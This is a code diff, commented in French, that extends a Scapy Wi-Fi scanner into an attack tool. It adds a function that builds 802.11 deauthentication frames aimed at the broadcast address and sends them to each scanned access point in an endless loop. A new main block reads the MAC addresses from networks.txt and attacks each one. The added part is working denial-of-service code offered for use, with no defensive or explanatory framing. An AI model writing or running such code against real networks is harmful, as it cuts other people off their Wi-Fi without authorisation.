@@ -1,17 +1,18 @@
-import scapy.all as scapy
-from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
+import os
+import time
 import logging
+from scapy.all import *
 
 # Configuration du logging
 logging.basicConfig(level=logging.INFO)
 
-def scan_wifi():
-    # Définition de l'interface réseau à utiliser
-    interface = "wlan1"  # Remplacez par votre interface réseau Wi-Fi
+# Définir l'interface à utiliser (e.g. wlan0, wlan1, etc.)
+interface = "wlan1"  # Remplacez par votre interface réseau Wi-Fi
 
+def scan_wifi():
     # Scan des réseaux Wi-Fi
     logging.info("Début du scan des réseaux Wi-Fi...")
-    packets = scapy.sniff(iface=interface, count=100, timeout=10)
+    packets = sniff(iface=interface, count=100, timeout=10)
 
     # Récupération des informations des réseaux Wi-Fi
     networks = []
@@ -36,6 +37,24 @@ def scan_wifi():
             f.write(f"{network[0]} - {network[1]}\n")
 
     logging.info("Scan des réseaux Wi-Fi terminé.")
+    return networks
+
+def deauth_attack(ap_address):
+    # Créer le paquet de désauthentification
+    packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_address, addr3=ap_address) / Dot11Deauth(reason=7)
+    
+    while True:
+        # Envoyer le paquet
+        sendp(packet, iface=interface, verbose=0)
+        logging.info(f"Paquet de désauthentification envoyé à {ap_address}")
+        time.sleep(1)
 
 if __name__ == "__main__":
-    scan_wifi()
+    networks = scan_wifi()
+
+    # Lire le fichier et effectuer l'attaque de désauthentification
+    with open("networks.txt", "r") as f:
+        for line in f:
+            mac_address = line.split(" - ")[0]
+            logging.info(f"Démarrage de l'attaque de désauthentification sur {mac_address}")
+            deauth_attack(mac_address)
